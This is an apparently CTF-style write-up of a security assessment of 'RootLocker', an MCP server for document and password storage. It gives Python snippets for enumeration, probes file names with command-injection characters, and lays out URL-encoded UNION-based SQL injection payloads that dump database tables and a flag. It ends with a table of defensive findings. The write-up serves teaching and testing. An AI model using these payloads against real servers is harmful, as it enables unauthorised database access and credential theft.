# RootLocker — MCP Server Security Assessment

## Scenario

RootLocker is a platform that provides cloud storage of documents and a password management service, exposed via an MCP (Model Context Protocol) server. The objective is to identify security issues in the server implementation and obtain the flag.

---

## Environment Setup

```bash
python3 -m venv mcp-rootlocker
source mcp-rootlocker/bin/activate
pip3 install fastmcp
```

---

## Usage

```bash
python3 rootlocker_exploit.py http://<TARGET_IP>:<PORT>/mcp/
```

---

## Exploit Chain Walkthrough

The assessment follows a five-phase methodology against the MCP server.

### Phase 1 — Reconnaissance

```python
resources          = await client.list_resources()
resource_templates = await client.list_resource_templates()
tools              = await client.list_tools()
```

**Why:** Before testing anything, enumerate every capability the server exposes. MCP servers advertise resources (static data endpoints), resource templates (parameterized endpoints), and tools (callable functions). Printing the URI, name, and description of each reveals the full attack surface. In this case, the server exposes:

| Type | Capability | Purpose |
| --- | --- | --- |
| Resource | `get_access_logs` | Server access logs |
| Resource | `get_error_logs` | Server error logs |
| Resource | `get_server_uptime` | Server uptime |
| Resource | `count_files` | Number of stored files |
| Resource | `get_platforms` | List of platforms with stored passwords |
| Resource Template | `getfile://{file_name*}` | Retrieve a stored file by name |
| Resource Template | `password://{platform}` | Fetch stored password for a platform |
| Tool | `store_file(file_content, file_name)` | Store a file |
| Tool | `store_password(password, platform)` | Store/update a password |

### Phase 2 — Information Gathering

```python
result = await client.read_resource("resource://access_logs")
result = await client.read_resource("resource://error_logs")
result = await client.read_resource("resource://platforms")
```

**Why:** Static resources often leak sensitive information. Server logs can reveal internal paths, valid data values, stack traces, API keys, or credentials through verbose error messages. The platforms list tells us which values are valid input for the `password://` template, which is essential context before probing for injection.

### Phase 3 — File Storage Tests

```python
result = await client.call_tool("store_file", {
    "file_content": "MCP security test",
    "file_name": "testfile"
})
result = await client.read_resource("getfile://testfile")
```

**Why:** Test every capability for unexpected behavior. Writing and reading back a file confirms the tool and resource template work as documented. Appending injection characters to `file_name` (e.g., `testfile'`, `testfile;id`) probes for secondary injection points in the file storage backend. Even if not directly exploitable, error messages may disclose internal paths or storage mechanisms.

### Phase 4 — SQL Injection Discovery

**4a. Trigger a SQL syntax error:**

```python
result = await client.read_resource("password://rootlocker.htb'%23")
```

**Why:** The `password://` template fetches data from a database. Injecting a single quote (`'`) breaks the SQL syntax. If the server returns a SQL error instead of a generic message, SQLi is confirmed. The `%23` is URL-encoded `#`, which is the MariaDB/MySQL line comment character. We use `#` instead of `--` because MariaDB requires a space after `--` for it to be a valid comment, and the trailing `LIMIT 1` appended by the server query would otherwise remain active and break the injection.

**4b. Determine column count:**

```python
for i in range(1, 10):
    await client.read_resource(f"password://x'%20ORDER%20BY%20{i}%23")
```

**Why:** `UNION SELECT` requires matching the number of columns in the original query. `ORDER BY N` succeeds when column N exists and fails when it doesn't, revealing the exact column count. We use `x'` (a non-existent platform) so the original query returns no rows, ensuring only our injected data appears in the result.

### Phase 5 — SQL Injection Exploitation

**5a. Enumerate tables:**

```python
payload = "password://x'%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%201%20OFFSET%20{i}%23"
```

**Why:** `information_schema.tables` lists all tables in the database. Filtering by `table_schema=database()` restricts results to the current database, avoiding system tables. Since the original query uses `LIMIT 1`, only one row returns per request — we iterate with `OFFSET` to extract each table name.

**5b. Enumerate columns:**

```python
payload = "password://x'%20UNION%20SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name='{table}'%20LIMIT%201%20OFFSET%20{i}%23"
```

**Why:** Once we know the table names, `information_schema.columns` reveals the schema of each table. This tells us which column holds the flag.

**5c. Dump the flag:**

```python
payload = "password://x'%20UNION%20SELECT%20flag%20FROM%20flag%20LIMIT%201%20OFFSET%20{i}%23"
```

**Why:** Final extraction. With the table name (`flag`) and column name (`flag`) known, a direct `UNION SELECT` dumps the contents.

---

## URI Encoding Reference

MCP resource URIs go through Pydantic URL validation, which rejects raw spaces and certain special characters. All payloads must be URL-encoded:

| Character | Encoded | Usage |
| --- | --- | --- |
| (space) | `%20` | Separate SQL keywords |
| `#` | `%23` | MariaDB line comment (replaces `--`) |
| `'` | `'` | SQL string delimiter (not encoded, part of injection) |

---

## Vulnerabilities Identified

| # | Vulnerability | Location | Impact |
| --- | --- | --- | --- |
| 1 | Information Disclosure | `resource://access_logs`, `resource://error_logs` | Server logs exposed to any MCP client, leaking internal context |
| 2 | SQL Injection (UNION-based) | `password://{platform}` resource template | Full database read access — table enumeration, column enumeration, data exfiltration |
| 3 | No Input Validation | `password://{platform}` | User-supplied platform value passed directly into SQL query without sanitization |
| 4 | Verbose Error Messages | `password://{platform}` | SQL syntax errors returned to client, confirming DBMS type (MariaDB) and query structure |

---

## Key Takeaways

- MCP servers are **directly accessible** to anyone with network reach — no LLM jailbreaking required to exploit vulnerabilities.
- Resource templates accepting user input are high-value injection targets, especially when they interact with databases or APIs.
- MariaDB/MySQL comments (`#` / `%23`) are the reliable comment character when `--` fails due to missing trailing space.
- Always use a **non-existent value** (`x'`) as the injection base so the original query returns empty and only UNION results appear.
- Verbose SQL errors are a finding in themselves — they confirm the DBMS and leak query structure to the attacker.